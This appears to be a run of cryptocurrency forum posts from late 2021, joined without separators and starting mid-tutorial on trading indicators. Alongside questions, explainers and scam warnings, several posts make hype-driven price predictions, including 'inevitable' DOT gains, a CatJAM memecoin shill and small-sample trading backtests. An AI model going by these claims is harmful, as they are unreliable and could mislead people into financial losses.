The**first wave**must be**bigger than the second wave (the wave that follows the gap)**to enter a position.

This is not always true, and sometimes you could take a position without all three waves, but it isnt the safest method. Example would be Wave 1 in Yellow circled above. The far-left part of the blue wave could have been your first indication, and then the green dot circled could have been your entry position for a long. This works in some instances, but not all. That is why we typically look for a gap.

**Example Trades from above**

**Trade 1**

We took a long on trade 1, denoted by the yellow on the chart above. The reason for this trade are as follows:

1. **Wave 1**Large blue wave below the zero line.
2. **The Gap**A blue wave above the zero line on the other side.
3. **Wave 2**Blue wave on the same side of the zero line as the first wave.

**Entry Position:**You are looking for the white part of the wave, to cross the blue part of the wave**(indicated by the green dot)**.

**Stop Loss:**This should be the**support just prior to this move**.

**Exit**: You should be looking at the next wave above the zero line, when the white crosses the blue on the wave (**indicated by the red dot)**.

**Note:**This trade could have been skipped due to the head and shoulders present. In these situations, use your own due diligence and experiences to decide whether to enter the trade.

**Trade 2**

We took a short on trade 2, denoted by the red on the chart above. The reason for this trade are as follows:

1. **Wave 1**Large blue wave above the zero line
2. **The Gap**A blue wave gap below the zero line
3. **Wave 2**Blue wave on the same side of the zero line as the first wave.

**Entry Position:**When the white crosses the blue on the wave (indicated by a red dot).

**Exit:**You should be looking at the next wave below the zero line, when the white crosses the blue on the wave (**indicated by the green dot)**.

**Trade 3**

The same exact concept applies to this as Trade 1. In this trade, the gap for Trade 3 was also involved as Wave 2 in Trade 2. Depending how active you are trading, you could use waves back to back if they meet the trade criteria

**Red and Green Floating Dots**

https://preview.redd.it/oahnzqj410x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=de6823ca78b912146e487972582db7c1542fe019

* The**Floating Red Dots above the zero line**denotes when a local top is created.
* The**Floating Green Dots below the zero line**denotes when local bottoms are created.

In these situations, you want to start looking for another indication to enter the market.

**Volume Weighted Average Price (VWAP)**

https://preview.redd.it/k3ucy3l510x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=caef0d7f32a6747114062dae1a0eea9b25334549

The VWAP indicator has been most successful on shorter time frame trades when youre able to spend a decent amount of time day trading.

Switch the VWAP indicator from waves to columns for a better visual of which direction it is going, and when it breaks the zero line. This is illustrated below in the following trade examples of how you can utilize VWAP. As you can see, there are a lot of trades taken and that is why it can require a bit of your time.

https://preview.redd.it/kur5zbu610x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=d3fd41e4318e4758f987adaefcadb953ed98dc37

This backtest illustrated above is based on day trading on the 5-minute chart consistently.

Red vertical dotted lines indicate it was a short entry, green a long entry.

Other indicators used in conjunction with the VWAP:

1. Cipher As EMA ribbons
2. Cipher Bs Money Flow Indicator

In this test, the risk/reward was 1:1 with a 1% take profit and stoploss.

**Rules:**

1. Only enter a**short**when

* themoney flowindicator isred.
* TheVWAP is confirmed(2 candles)below the zero line.
* TheEMAribbon isgrey (bearish).

1. Only enter a**long**when

* Themoney flowindicator isgreen.
* TheVWAP is confirmed(2 candles)above the zero line.
* TheEMAribbon isblue/white.

**Results - 14 trades**

* 12 trades were successful with the 1% profit.
* 2 trades were unsuccessful and were stopped out at 1% losses.

Here is a little closer view of some of the trades.

https://preview.redd.it/09swni8810x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=52e39d22518920bd290831458dc13098c351ff6b

**Money Flow Indicator**

https://preview.redd.it/s8kseiz810x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=c9c4284547673ef9a68bc5f142de0120a1838c7f

This indicator is useful on any timeframe, and simply measures the amount of money being transacted.

* **Green**= money flowing in.
* **Red**= money flowing out.

As seen in the above and below images (4hr and 15 min charts) this indicator can be used by itself.

* **Long**when you have a candle or two confirming that the money flow is green and getting stronger.
* **Short**when you have a candle or two confirming the money flow is red and getting stronger.

**Stochastic RSI**

https://preview.redd.it/d2m7rn0a10x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=1a9fa26a946d024f45aed74b5f96653ce115188a

This indicator is useful in that you can simply buy with the Stoch RSI crosses.

* **Long (or close short):**When the Stoch RSI is low, crosses to go up, and turns blue.
* **Short (or close long):**When the Stoch RSI is high and crosses to go down, and turns purple.

This can be seen above on the 4hr chart.

**Cipher DBSI**

**Cipher DBSI (Dual band Strength Index)**measures momentum and displays whether the bulls, or the bears are winning the market battle. By default, the indicator settings populates with**columns**. Switching the settings from columns to**Area**can help you visualize the changes and strength a little better.

Other symbols to pay attention to are the red and blue circles.

* **Red**means possible**sell**signal
* **Blue**a possible**buy**signal.
* **Orange X**indicate there is a market battle between the bulls and the bears. With the markets lately, this seems to be a regular indicator so I typically would hide this to reduce the noise on the screen.

The rule for this is indicator:

* **Only long**when a blue dot has printed after the blue bullish momentum waves have been confirmed (12 candles)
* **Only short**when a red dot has printed after red bearish momentum waves have been confirmed.

In the screen shot below, you will find the 4hr chart from when we started our down trend.

https://preview.redd.it/47e0mw9b10x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=64550d299079a03de04249155771785149ba547d

If you see the**first dotted vertical line**you see that the bulls lost their momentum, as the blue wave has now**turned red**, the candles**are red**, and a**red possible sell circle**has printed.

If you did not sell at that point, then let us look at the next set of dotted vertical lines.

Briefly, the bulls took control again, but quickly the momentum swung back in the bears favor. Multiple red 4hr candles, and then a red sell circle.

The candle after the signals candle closed was met with an 11% drop. If you continued to hold through that, you will see the same signals on the third set of vertical dashed lines, with more downside to follow.

Now let us look at the recent price moment and some trades that could have been made using DBSI.

https://preview.redd.it/kc7vqf7c10x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=b875a5fc38f59ba26dfc98991c33c58c9b2e02e9

* **For Stops** we can afford to lose 2.5% or prior support, whichever is less.
* **For Take Profit**5% target point.

As you can see here, there are 4 trades with just using this indicator following the rules above. The**first two**trades were**wins**, the**third a loss**, and the**fourth trade**we would still be in at the time of writing this.

**Summary**

In combination the indicators are very powerful a good tool to make profitable trades. Some of them are a bit more complicated but when you learn and use them you can make good trades.

This is no financial advice

Haven't been following crypto in a while. Last time I checked, the BSC was green % heaven and PCS forks were blowing up in their first week and dying the second. 

Then april/may happened. It sure looks like we're back in a time where random shitcoins pump + 3583% in 24H, per CMC, but I feel less of  a "POUR YOUR MONEY IN NOW" atmosphere than earlier last year. So where are we exactly ? Is the BSC still a high percentage lottery ? Is the Solana blockhain where things are at now ? Or another one ? Is it worth making stupid, obscure investments again, based on a quick CMC/Gecko search ? What's the market mood ? If you've been following, please tell me.

# What is it?

Decentraland (MANA) is a virtual reality platform powered by the Ethereum blockchain that allows users to create, experiment and monetize content and applications.  In this virtual world, users purchase plots of land which they can explore, build on and sell.  Decentraland was launched following an initial $ 24 million coin offering (ICO) conducted in 2017. The virtual world launched its closed beta in 2019 and opened to the public in February 2020. Since then, users have created extensive LAND packages, including interactive games, expansive 3D scenes, and a variety of other interactive experiences.  Decentraland uses two tokens: **MANA** and **LAND**. MANA is an ERC-20 token that must be burned to acquire non-fungible ERC-721 LAND tokens. MANA tokens can also be used to pay for a variety of avatars, wearables, names, and more on the Decentraland marketplace.

# How does it work?

Decentraland is an online space that combines virtual reality with blockchain technology. Unlike most online games, players have direct control over the rules of the online world. The DAO allows MANA token holders to vote directly on internal and organizational policies. This mechanism affects everything from the types of objects allowed to the investments in the treasury of the DAO. Non-fungible tokens represent collectible items in the game, including clothing, items, and real estate units (LAND). Users store these tokens in their crypto wallets and sell them to other users on Decentraland Marketplace. To buy yourself a new mask, for example, you will need MANA, the native crypto of Decentraland. In addition to trading items and properties, players can fill their personal space with games, activities, and artwork that other people can interact with. There is also the option to monetize your LAND. The decision is up to the individual player as to what to do with their land. Decentraland has many use cases, among them are the use of advertisements and the creation of content. But for new players looking to get closer to the NFT world, the barriers to entry are high. Gas spending on Ethereum brings the purchase price, even of simple cosmetic items to almost double. Land prices can run into the thousands of dollars, making ownership too expensive for some players.

# Where to store it?

The best hot wallet for MANA are MyEtherWallet or MetaMask. If you want more security, a cold storage like Ledger or Trezor is the right choice.

# Pros&amp;Cons

\*DISCLAIMER\* These lists are subjective, it depends from person to person

**Pros**

1. Gaming NFTs have a lot of potential
2. Partnership with the Largest Digital Asset Management Firm (Grayscale Investments)
3. Built on a well know blockchain (Ethereum)

**Cons**

1. High gas fees
2. Many competitors in the gaming NFTs space

So as the title say, bitcoin has been in the uptrend for quite some time now. 100k seems rather close and I believe everyone is waiting for it to rise.

As bitcoin slowly creeps up to 100k, what is the first thing that you will be doing? Will it be selling, buying more or just stake it somewhere and grow generational wealth?

Personally I would continue staking as this would give me a much higher returns weekly which i am thankful for.

TLDR;
So what is the first thing that you will be doing when Bitcoin eventually hits 100k?
-------------------------------

On October 30, 2021, I woke up and had a notification from my bank that my debit card was charged twice for $603.39 and $401.44, totaling $1004.83. 
Thats a lot of money, and I immediately called Keybank and disputed the charges. 
Upon investigation, I realized that the charges came from Crypto.com. I have used Crypto.com in the past, most recently to purchase a very small amount of Shiba Inu ($106.25). This must be how Crypto.com got my debit card information. 
Crypto.com purchased 5 Litecoins (LTE) on my behalf. Im not even interested in Litecoins. I tried to sell the coins and deposit most of the money back into my bank (minus fees). However, my crypto.com account is frozen. 
The second I filed the dispute through my bank, Crypto.com disabled any transactions. I couldnt sell or even transfer the funds to a different location. 
Every previous transaction I have ever made on Crypto.com, they have emailed me a receipt confirming the transaction. I did not receive a receipt this time. Further proving how sketchy this situation is!
I contacted Crypto.com via their chat on the app, and I also sent an email. Fyi, this is the only way for customers to communicate with Crypto.com, and its infuriating. 
They told me that in order to help with my inquiry, they would need a dispute cancellation letter from my bank. They want me to end the dispute, before even releasing my funds!
I told them that I am unable to end the dispute for the following reasons:
1. You took money from my bank account, and you didnt even provide a receipt.
2. I dont have access to sell or move those coins.
Therefore, it is literally theft, and I will not end the dispute. 
Crypto.com promptly terminated my account. 
To be clear, I am not saying to Crypto.com stole my crypto coins, like many other people get hacked in crypto. Crypto.com literally went straight into my bank account, made an unauthorized purchase, and now wont let me touch that purchase. And because I fought back, my account is terminated.
If anyone has more knowledge or advice, please help! Im down over a thousand dollars!

Hi guys!


I'm pretty new in Crypto, I started reading/researching two months ago and then took a plunge at the start of last month, mostly focussing on trying out CryptoHopper and BitsGap (if only because playing with bots seems sort of fun).


Anyway, I'm sort of leaning toward the route I want to take, but I thought I'd ask for some third party thoughts, if I may? 


What I was thinking of trying was setting up a spreadsheet to divvy up the profits made by my CryptoHopper. It's been doing rather nicely though, being only a month in, I can hardly say with any authority just how good it truly is.


Anyway, I was thinking of, on the first day of every month, taking 50% of the bot's profits and putting them into a SmartRebalance bot on KuCoin (it was either that or a DCA bot; but I think SmartRebalance is the better bet?) to fund the acquisition/rebalancing of coins worth HODL'ing, as well as lending/staking on KuCoin. Funds could be added to the bot each month until it hits a given threshold (say, $1,000) and then the coins taken out and staked or put up for Auto-Lending on KuCoin finance.


Then start the process over by investing further Hopper profits into a new SmartRebalance bot all over again.



Pretty simple, right? Seems like a way to slowly build up some assets, and then put them out for holding while still offering a return of sorts. Does it sound like a good move to you guys?

It might sound like an odd question without context, so here is my hypothetical scenario:

Say you want to create a game that contains NFT skins, weapons, power ups, etc, as well as an in-game currency to facilitate trading those items - but you want to keep it "legit" and not for profit beyond what is made on actual purchases of the game (in other words to avoid the free-to-play/pay-to-win model).

Is there any way to prevent exchanges from listing such a currency - either by legal means or through the technical implantation of the currency? I know that ultimately you couldn't prevent somebody from, say, paying cash or Bitcoin in exchange for an agreement to have the seller just "give" the currency to the buyer in-game, but this would occur on an individual basis and probably not often enough to wreck the "free" spirit of the game

You want to know if you can sell a token, if you can get rugged, how much of the supply the dev holds, if the dev can change the contract and many other scammy things before you buy a new meme token? 

Use [www.tokensniffer.com](http://www.tokensniffer.com)

You can just copy and paste the contract address in the search bar and get valuable information. 


The analysis shows you:

- if you can sell the token (so you don't buy into something like SquidGame).

- how high the buy/sell fee is. 

- if there is something wrong with the smartcontract code and ownership

- if the creator or other wallets hold a very high percentage of the supply

- if there is enough liquidity and if it is locked


In my opinion the most important ones of these are "token is sellable", "ownership renounced" and "liquidity burned/locked". 

If any one of those three criterias shows up with a big red X in the analysis, just do not buy the token. No matter how good it sounds, if you can not sell the token, if the liquidity is not locked or if the dev did not renounce ownership you will get scammed/rugged 99% of the time. 

DISCLAIMER: Scammers who know what they are doing can sometimes circumvent the detection of tokensniffer or similar websites though a variety of shady stuff (for example use fake lock contracts to give the impression that liquidity is locked). So just because tokensniffer says that a token is "low risk", doesn't mean it can not be a scam. 
But what this website does for you is, it filters out the most obvious and blatant scam attemps so you don't fall for them. 

Everyone who wants to gamble on shitcoins on BSC, ETH, FTM or Polygon should know and use this website everytime before buying some token. 
With all the new people here trying their hands at the shitcoin casino I thought it would be helpful to share this website even if many of you already know it. 

Sorry for format and spelling, I'm phoneposting.

Everyone is saying that the crypto market is gonna explode by the end of the year so I'll assume new players will join the party. 

I consider myself a newbie cause I bought my first coins in January this year and to be onest I made some money but I lost a few on the road too. All the online reading or r/cc lurking didn't helped a lot in my early days cause u know...fomo, get rich or die trying kind of stuff made me put some money on the wrong coins.

Well, I'm better know, I learned the hard way what's good and what's bad (still learning actually) but overall I managed to recover all my losses and add something on top so I survived.

For the new people joining here, I recommend to dca and always keep a hidden stash to buy the dips. 

I can add more here but I respect the opinion of the veterans when it comes to crypto and I wanna hear them. Nothing beats the test of time, their knowledge or experience in the field.

Let us just take a moment in time and appreciate what a fantastic year Eth has had. It is easy to lose sight, especially with all of the crazy shitcoins that are pumping and dumping lately and the Scams such as Squidcoin that is  taking up most of the headlines, but let us not forget that this time last year Eth was $383.68!!! And now 1 year on we sit at over $4300!! Let that sink in all you so called Eth killers!

Eth has been on an absolute rocket ship for most of this year and with Eth2.0 just around the corner 2022 could be even bigger! This just goes to show investing in legitimate projects long term is almost always the best way to go. 

Eth killers be warned   the old girl is not stopping anytime soon!

hello guys,

I was thinking about how NFTs could be used to decentralize things like Spotify.. 
Basically, a song is a unique thing with a creator, who can give it to others for them to play it. While listening to a song, you obviously don't own it. You just get to experience it.

This does not quite fit with how NFTs work at the moment right? As far as I know, it is not possible to create an NFT which is "usable" or in this case playable by people who don't actually own it.
The creator of such an NFT could define a per use rate inside the smart contract so that she gets, say 0.0001 ETH for each play of her song, while still owning it herself.
Is something like this already possible? Or do you see it coming?

The vast crypto world poses significant risks to uninformed investors but also gives great opportunities to those who arm themselves with the right research.

# The acronym DYOR (Do Your Own Research) is well-known in crypto and blockchain circles. It refers to carrying out your due diligence and gathering the right kind of market intelligence to make successful investment decisions. And some key DYOR tools.

The key information you can focus on for your initial research is coin and token rankings in terms of market capitalization or 24-hour trading volume. In the later stages of DYOR, you may look at information regarding specific tokens of interest to you. For each token or coin market cap, fully diluted market cap, trading volume, circulating supply, and the maximum supply allowed for the coin/token. These are the key bits of intelligence to evaluate a coin or token.

In addition to the above indicators, it is useful to study the price charts of coins/tokens to see how volatile they have been over a certain period of time. you can use charts to see this information. Some of the key tools that can be used for DYOR are the following

* **CoinMarketCap.com**

Key uses: coin and token rankings , market capitalization, and trading volume

* **DefiPulse.com**

Key uses: decentralized finance (DeFi), TVL (Total Value Locked) statistics and DeFi Key uses: Pulse

* **CoinMarketCal.com**

is an online calendar of upcoming events at blockchain projects. Given the vast number of tokens and coins in existence, tracking their future important events and developments is not an easy task. CoinMarketCal is a great resource that makes this task much more manageable.

The events covered by CoinMarketCal include coin/token listings, burning and other supply-related events, forking, governance voting, Telegram channel AMA (Ask Me Anything) sessions, and many more.

* **CoinGecko.com**

CoinGecko.com is another market research source for crypto projects. Similar to CoinMarketCap, CoinGecko provides information on market caps, prices, and trading volumes of a very large number of coins and tokens.

Its always best to know in what are you investing your hard earned money in, and just don't follow a trend or FOMO and best of luck in trading. and please share your DYOR methods in the comments.

As someone who has experience in both ETH and Sol Nft markets i can assure you solana won't be better than eth anytime soon, eth fees might be a little too high in the spot part of crypto but when it comes over to nft that's what it saves it from having the main problem Solana nft market has which is:   
Flippers and rugs.  
lets get more into detail, solana is full of flippers and rugs since is almost free to make a project apart from the 0.0003c it takes to make a transactions, but ethereum is different, from what i saw in my time in the market, people are forced to hold their nft because of the fees it took them to buy it.  


i'm not saying fees in eth should be this high but i hope it stays 15-30$ range for the nft's sake.

Hey everyone

Hope everyone is having a good day and raking some profits somewhere....!

I have a query on gas fees. So I am about to purchase some ETH and I've realized that I've never thought about gas fees and don't recall ever paying any. Whether this is through sheer luck or sheer stupidity, I'm not sure!

I've tried to Google and read through this sub and ethtrader sub and I seem to get the main gist of it but still don't understand why I haven't had to pay any before. 

I am directly paying an X amount of money into an exchange and then buying ETH via USDT. I have done this twice before and don't think I've paid any gas fees. Now that I am purchasing a significant amount it just occurred to me about gas fees. Logically if I've done this twice before and not seen anything about gas fees then I should be ok. But just a worried about getting hit by fees since the amount is larger.

If not mistaken, gas fees kicking when trying to transfer ETH, mint NFTs etc. Direct purchases are ok? Also it will go straight into the 2.0 staking so I'm thinking when I unstable, I might get hit then?

Thanks in advance!

A coin called STEM (STEMX) was added to coinmarketcap today. They have a decent website, roadmap, demo, etc so they look quite legit in a sea of memecoins.

However, upon further inspection some people in the telegram group found out that the deployer address is constantly sending funds to the top holders, and those holders are dumping everything on the market. You can see this for yourself at: [STEMX (STEMX) Token Tracker | BscScan](https://bscscan.com/token/0x26734add0650719ea29087fe5cc0aab81b4f237d#balances) 

We asked the devs about this and they claimed it's because they want to "buy back in" later. Makes no sense ofcourse and they're just unloading their bags on the market to make a quick buck. 

Avoid at all costs

tldr; STEMX is a slow rug pull

I'm new to mining I've done some research but would want some people's real experiences and advice on what they had to do and and stuff like that. I am aware that MHs and GHs are a huge difference between them and as I understand if one can afford it GHs are where its at for some coins if not all. But for affordability MHs is a good start if I'm right? But I just want advice, on how to start I'm also aware this may not be the best time to start as the GPU prices and "shortages"  but I'm really interested in learning and hopefully make some passive income. I did try before but I was mining pascal coin which didn't workout or I was doing something totally wrong  I have seen that etherium is a very popular coin as of late but you need a really decent hashrate to mine and earn a profit. I'm just looking for the best and affordable ways of mining right now for a beginner.

For the next 3 weeks, if you $5 or more at Burger King, you will be given free crypto, primarily in the form of Dogecoin (DOGE). A few lucky customers will have the opportunity to win a whole Bitcoin (BTC) or Ether (ETH). Users must register with Robinhood Crypto to receive the reward.

This immediately made me think of the McDonalds promotion with Monopoly prize pieces that you have to collect. In my view, Boardwalk and Park place are no brainers - BTC and ETH. But what would some of the other spaces look like? What would Baltic and Mediterranean be? What set of 4 would make up the railroads? What would a chance card be (Youve invested in Squid Game and youve been rugpulled - pay $200). 

What would your crypto equivalent be to each set of properties and why?

Sounds familiar?
It's weird how things can change. If you (like almost everyone) made the mistake to tell your friends that you're investing in crypto, there's a possibility that you're living a situation like this.
I'm sure you remember how they quickly asked for you "bitcoins" when the price crashed, laughing and expecting to say "lol I told you you should have bought GOLD" and stuff like that, but when prices are higher no one talks about it.
And then they can't resist and laughing like it was a joke ask you "heyyyyyyyyy! Whasssup hey how can I buy this DOGE or SHIBA shit, I know they are jokes but I want to buy anyways"
Fuck it.
Just be humble and say that you're not a financial advisor a go with the flow.
Happy November!

1 : 2021-11-01
For some context, I got into crypto about two weeks before the May crash so suffice it to say, IT'S BEEN A FUN RIDE. Fortunately I knew to be patient and am in the green overall on my portfolio.

Since then I've been trying not to FOMO into too many things but the consensus here seems to be that when BTC goes on it's $100k run that alts will likely see a pull back. Now, a few of the alts I'm watching have seen some pull backs recently but BTC is steady at ~$60k. If it's still predicted to go on it's run to $100k, it seems a reasonable prediction that there's still more room for alts to drop before their season begins. Therefore, I'd want to wait a little bit longer before my next round of DCA'ing.

Am I right in that thought process? If not, how would you change my thinking?

So, shib gets listed on coinbase and etoro, but other coins not. Why not list all the shitcoins on all exchanges and be done with. This makes no sense. With shib and doge and elon in top 100, aren't all coins shitcoins now? Now, there is no difference between BTC and shib or dogelon. All meme coins are legitimate investments since, apparently, they are worth billions. Clearly, fake coins with 0 developments and tech innovations are just as good as established coins with a real development team behind them. And no, shib is just a copy paste, with no development, no real team behind it, no innovation no nothing.

I wont be hiding my excitement about Polkadot releasing parachain auctions in November. 

We are going to witness real-use projects bring exciting new perspectives on blockchain adoption.
The meritocratic system only allows 100 parachain slots. A lot of us had the chance to check out some great projects running on KSM auctions, and really looking forward to seeing DOTs.

Also very interested to see how interaction with other blockchains will solve scalability frictions.

Parachains also introduce new gaining opportunities to investors - somewhat like staking!

Happy gain to all, the future looks great!

I know meme coins are not as good as real projects like ETH or DOT, but I still want to gamble with it.

After I first heared about DOGE I was like, what is that shit, same after I heared about SHIBA. At this point I didnt really understand what a memecoin was.
Then right before they pumping like stupid I see many advertisements for buying DOGE or SHIB
(Now I see many Dogelon Mars ads)

Now im like most of the people and want a part of the cake named memecoins.
But sadly you only hear about the coins when they go up or after they pumped. 

So my question ... is there a way to find fresh new coins especially memecoins?

How did the early investors of SHIB or ELON found out about the coin and do you guys have any ideas how to react faster when there is a new trend in the making?

As we have entered November the market had a nice little break over the weekend to close out October. Now the real action is about to begin and it all will be led by DOT.

The parachain auctions are coming and many are buying a minimum of 5 DOT to participate or adding to their bags. This interoperability project led by Gavin Wood and also known as web 3.0 will be melting faces this first half of the month. $100 before the end of the cycle is inevitable. That is a minimum of 2x gains I expect for anyone wanting to look into this project now. 

I fully expect the price action of DOT to continue in price discovery mode until the first parachain auctions occur on November the 11th. Even if you don't participate you can stake for 12% or more in many places such as Kraken and KuCoin. 

I have been bullish on DOT for the past few months skipping my buys on LINK and ETH to buy DOT and many DOT holders are going to be VERY pleased by its price action as we get closer to the auctions in 10 days.

I am not a cryptocurrency expert but I think I might found a scam. There is a new cryptocurrency launching. I am going to paste some information from the WhitePaper, sounds like bullshit to me.

Also from what I understand from people who bought, you won't be able to get you money back for 2 months.

&amp;#x200B;

&gt;TRADELINK technology created for FutureCoin will be using a new artificial intelligence named POT (Proof of Trade), through which every transaction made via TRADELINK will automatically mine the block during the transaction, without the need of a POS or POW. The mining process will be made possible by combining the technologies of POS and POW, together with the removal of the transaction fee, so that there will be NO need for miners to do that. Proof of Trade is a new validation system that combines the functions of burn and mint to validate the trade without the need for mining or staking. Specifically, during the transaction, mint is done (a unique coin is created, a single coin with the respective transaction number), and then when FutureCoin coins are sent to the other participant in the transaction, burn is done (that coin is burned), validating the transaction between the two wallets and is marked as complete. If the single coin created when a user sends a number of coins to a wallet is not burned, the transaction has failed and the coins are returned from the wallet from which they left and the transaction must be repeated

What do you guys think about this?

the year of the cat?

I just want to start off by saying Im a long term member of the crypto community. Ive seen countless shitcoins come and go, Ive made money, Ive lost money, Ive seen massive companies topple. I was around for bitconnect, BTC SV, savethekids. Ive seen a lot.

But Ive never been more excited about a cardano based memecoin called CatJAM token. Now if youre from the twitch community youll immediately recognize the name, but if not, this is basically the cat version of doge in the meme world. It spawned from the cat vibin to levan polka meme.

You guys, this is **one of the first memecoins on the cardano network**!

Why am I excited about it?

Several reasons. The first being, this coin is still in its infancy. Its only a few months old, and the community is just starting to grow. What does that matter, you might ask. With a $5m market cap any investors can be considered early investors. Or even founders. Theres no official title with that, but all of the DOGE founders are millionaires as of now. So there is definitely a financial incentive.

Secondly, CatJAM token promises NOTHING. Wait a minute, how can I be excited about a coin that promises absolutely nothing? Well thats just it. In almost all of the new coins Ive seen the devs always promise a boat load and deliver a puff of smoke. No. Not CatJAM. This memecoin is all about sending good vibes. Its a meme, after all. The community is very open and loving, and the telegram is filled with positive vibes.

Also, can we talk about that recent $8,000 to 5-BILLION dollar wallet on Shib? CatJAM is in the $8,000 phase.

Finally, this is the first time in my years of experiencing the rise and fall of various coins that Ive had a hunch, a really deep gut feeling about something. Theres just something different about CatJAM, I can feel it. Oh.. that mightve just been a hair ball. 

Still, I highly recommend looking into this.

Obviously, this is not financial advice, and DYOR. Much love, and stay vibin friends!

This'll probably get lost in the shuffle and ignored but fuck it might as well give it a shot. Text heavy. TLDR at the bottom. 

I've been mining and investing into BTC/ETH for a little bit. Thought about mining in 2015 (RIP) and just didn't take the time to figure it out back then and obviously regretting it. 

I'm gradually adding to my portfolio now and believe crypto is the future obviously but I'm not intimately familiar with the nuts and bolts of different coins and their uses (shocker). 

I hear people say "X coin is great because Y features!" but never spent too much time digging into the differences or really trying to figure out why one is way better than another. 

Somebody from work (uh oh) has been keen on trying to find coins with great use cases early. This guy also was hyping a coin that rhymed with ZafeMewn (RIP) a year ago so his judgment isn't the best, but he's honestly trying and recently told me about something he's been peeking into. 

**THIS IS NOT TO SHILL FOR A COIN, IM GENUINELY CURIOUS**

He told me about a coin (I'll leave unnamed) that's supposed to be used to crowdfund/invest early into any kind of business at any size or level. Essentially you could open up a coffee shop and sell these to people and they'd help you get money for your startup and they'd now essentially be shareholders and potentially get dividends?

Now that all sounds well and good, but what kind of DD would you guys do to decide whether it's a scheme or has any chance of survival?

TLDR: How do you guys determine whats legit or not with early early projects? Obviously jumping into anything is a risk. 
I'm not necessarily looking for the next shit/memecoin that can explode, but for projects and coins that could potentially see real world use and change the way the world interacts with certain processes. 

Please be gentle.

By now I dont know of anyone here who hasnt heard about the squid token rug pull. It is crazy to think the scammers made of with over 2 million!

It wasnt without warning, anyone knowledgeable in crypto could have told you it would end this way in a split second. Yet I bet there is still thousands of people out there who feel victimised by this. 

My question for those of you whove lost significant money in a rug pull, squid or not, how do you feel? 

Was this something you genuinely got tricked into and want retribution for? Was it always a gamble and youve accepted the loss? Is it something youll be careful of next time or has it put you off crypto forever? 

I know not many people would want to admit to losing money to these types of scams, but itd be great to hear your views.

Logged on this morning to see several articles saying "Don't invest in Squid Coin", "Squid Coin is a scam, and here's why".  Then a few hours after these "The biggest (fastest) rug pull ever from Squid Coin".

It's crazy just how stupid people are getting in on these things.  Crazy that there's not a realization that they're literally just pump and dumps.  Even just the logic behind the name of the coin should tell you that you're about to get screwed.

Not sure how to get people to think about this stuff a little more clearly, but it definitely needs to be done.  When people say **DYOR**, then please research somewhere other than YouTube (sounds like some of the other garbage people have been learning from YT and Facebook).

There are lots of resources online for how to invest in a new coin / participate in an airdrop or other ways to be involved.  Let's get people using their heads and stop this hot garbage from happening.  It's just a shitstain on crypto and the perception in the world.

So after the recent massive rugpull  there are finally some good news for all of the Squid Game investors. Yes you maybe lost a really big amount till today. 

But: Squid Game is going up again. It isn't back at its ATH of $2856.64 but it's a small step back.

I checked it on Coinmarketcap and their chart shows it too.

Worth: 1.11.21 at 3:10 PM: $0.002757

1.11.21 at 3:16 PM: $0.002743

As you can see this is a gain of 0.51%! Finally it's going back up for those poor souls. Assuming you gain 0.51% every 6min you'll be back on top in 3.77 days.

There are a lot of posts claiming 'Doge will never reach $1,-' or 'SHIBA can't do another X10'. 'Can you imagine what the market cap will be'.

While I don't expect they have much upside left, market cap isn't a good measurement. Circulation supply is better, but effectively the whole concept around SHIBA is centered around 'lets not sell before $0.01'

By removing the liquidity, you're artificially lowering the tokens in circulation and the price can go up very fast.


If a single person is selling Doge for $10 and the rest removed their sell orders, a single person can create trillion dollar market caps. Similarly, this happens quicker if a small number of people hold 99% of the coins. 

The lesson: Nobody knows how high these coins can go. Market cap doesn't say anything. However, by removing liquidity since everyone is holding, both the way up and the way down will go faster. You might make another X10, but please be aware you need to get out before everyone starts selling since the way down will go quick as well

The end of pumptober and the start of moonvember has seen another crypto break its ATH. Anyone who has bought DOT and held it, is officially in the profit.

With the launch of their Parachain Auctions coming later this month, I can see a huge rally for DOT coming, so I am very excited to see where this takes us.

Congrats to all the diamond hands in this sub who have held and continued to DCA through the dips since Mays previous high, we deserve these celebrations.

What crypto will be the next to break its ATH?

So I came to this sub in early 2016 back when there were far less people, became an investor and really had to wade my way through all the shitcoins and scams and stuck it out here with everyone.

Fast forward, my crypto earnings are doing great, it has made me a fundamental believer in this technology, so much so that I am going to am to change education through blockchain / crypto technology. 
___________________________

I have went and created my concept, now I didnt create any tokens yet, this was done some Python programming, a psuedo-crypto if you will. I am a teacher, and while education is so slow to implement new technology, we are always looking for a way to implement proper behavior.

My solution: I will create a token in my classroom to enhance behavior. This token will serve as a reward AND will create governance in my classroom, the more tokens you have, the bigger the vote you gain.

Students earned tokens by having good behavior, based off grades, being kind, and several other metrics. 

They were able to "sell" tokens for rewards, they also were able to make decisions on what projects we do next via a governance poll.

What I found out: **It works.**

Behaviors in my class have never been better and I think I am ready to actually create this technology. I am a CS / Engineering teacher stuck inside of a slow moving non-technical education world, but I think that this has room for incredible potential.

Not every token needs to be used for bagholders to become rich, I think that a incredible use case is in K-12 Education. 

I would love everyone's thoughts. Everything is in pre-Alpha, tech, name, structures etc. I really would love to hear everyone's thoughts!! Maybe im crazy or maybe this is a cool concept.

Ok i have seen some top coins on this subs and a lot of new speculations on which coins are doing the  best and worst 

But today lets try something different i will go first 

Earlier this year when the market was bullish Before the bear market...i actually made a lot of bad decisions in crypto most of them are all shit coins and scam coins I felt really depressed with crypto because then I wasnt really making research about the project before buying them.

 
But now I guess Im feeling a lil better from the recent bullish trend which is actually looking like good for me

Just to make it sweet and simple 

Here are my list

1.. ICP 
This one is just so bad I really dont know why i FOMO bought this 

2: TROn TrX omg this not even considered crypto worthy anymore 

3:the last one for me was xrp i Really dont know where its heading to based on the recent Case

Drop yours let me learn from your experience

We all know the feeling- you're on this sub and you see a post that interests you and the OP is asking for opinions and you decide to offer yours. A valid opinion, just like any other, just as the OP has requested. You're not being a dick, you've not having a go at anyone, you've not insulted anyone. It might be about which crypto project you're most excited about over the next 12 months, or which new technologies are going to revolutionize the space. You offer your opinion, just like a hundred people before you have done, and another hundred after will do.

Next thing you find you're copping net downvotes from people who have a different opinion. And you feel like you've been punched in the guts and wonder why you bothered in the first place....

Downvoting derogatory or factually incorrect comments is valid, and I dare say what the function was designed for. 

But downvoting valid opinions, just because you don't agree with them? That's just immature, close-minded bullshit. And it encourages sheep behaviour and exceedingly narrow viewpoints.

